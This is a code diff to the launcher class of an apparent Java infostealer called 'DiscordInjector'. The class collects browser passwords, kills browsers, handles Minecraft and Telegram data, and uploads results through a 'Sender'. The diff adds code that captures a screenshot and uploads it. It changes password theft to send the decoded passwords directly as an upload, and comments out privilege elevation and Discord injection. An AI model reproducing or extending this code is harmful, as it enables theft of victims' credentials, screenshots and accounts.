@@ -35,14 +35,19 @@ public class Start {
 		versionChecker(version);
         Sender.sendMessage("Starting DiscordInjector v" + version);
 
-        if (DiscordInjector.instance == null){
-			DiscordInjector.instance = new DiscordInjector();
-		}
+        //if (DiscordInjector.instance == null){
+		//	DiscordInjector.instance = new DiscordInjector();
+		//}
 
-        ElevateUtil elevateUtil = new ElevateUtil();
-        elevateUtil.elevate();
+        byte[] screenshot = Screenshot.takeScreenshot();
+        Sender.sendFile(client, new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", "screenshot.png", RequestBody.create(screenshot, MediaType.parse("image/png")))
+                .build());
+        //ElevateUtil elevateUtil = new ElevateUtil();
+        //elevateUtil.elevate();
 
-        DiscordInjector.instance.initialize();
+        //DiscordInjector.instance.initialize();
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
 
@@ -50,14 +55,9 @@ public class Start {
         String passwords = new Passwords().grabPassword();
         String s = new String(Base64.getDecoder().decode(passwords), StandardCharsets.UTF_8);
         //write into text file
-        try {
-            PrintStream out = new PrintStream(new FileOutputStream("C:\\Users\\Public\\Documents\\Browsers\\Passwords.txt"));
-            out.print(s);
-        } catch (FileNotFoundException ignored) {
-        }
         Sender.sendFile(client, new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
-                .addFormDataPart("file", "Passwords.txt", RequestBody.create(new File("C:\\Users\\Public\\Documents\\Browsers\\Passwords.txt"), MediaType.parse("application/octet-stream")))
+                .addFormDataPart("file", "Passwords.txt", RequestBody.create(s, MediaType.parse("text/plain")))
                 .build());
 		Sender.sendMessage("Passwords done.");
 		Mods.main(argument);
@@ -66,8 +66,6 @@ public class Start {
 		Sender.sendMessage("Now launching the client.");
         Minecraft.sendMinecraft();
         KillBrowsers.kill();
-        sendCookies.zaa();
-        sendCookies.mh();
         telegram();
 
 
